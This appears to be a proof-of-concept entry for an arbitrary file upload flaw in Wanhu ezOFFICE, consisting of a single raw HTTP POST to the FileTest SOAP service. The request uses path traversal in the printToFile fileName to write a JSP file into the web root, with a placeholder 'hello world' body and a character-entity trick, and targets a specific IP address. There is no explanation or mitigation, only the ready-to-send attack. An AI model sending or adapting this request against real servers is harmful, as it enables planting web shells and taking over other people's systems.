# 万户 ezOFFICE FileTest 任意文件上传漏洞

    ```
POST /defaultroot/services/FileTest;1.js HTTP/1.1
Host: 111.59.90.19:7001
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,fil;q=0.6 Connection: close
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Content-Length: 840

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://com.whir.ezoffice.ezform.util.StringUtil" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"> <soapenv:Header/>
<soapenv:Body> <util:printToFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<fileName xsi:type="soapenc:string">../server/oa/deploy/defaultroot.war/public/upload/date.jsp.</fileName> <content xsi:type="soapenc:string"><%
    out.p&#x 72;int("hello world !");
%></content>
</util:printToFile></soapenv:Body></soapenv:Envelope>
```
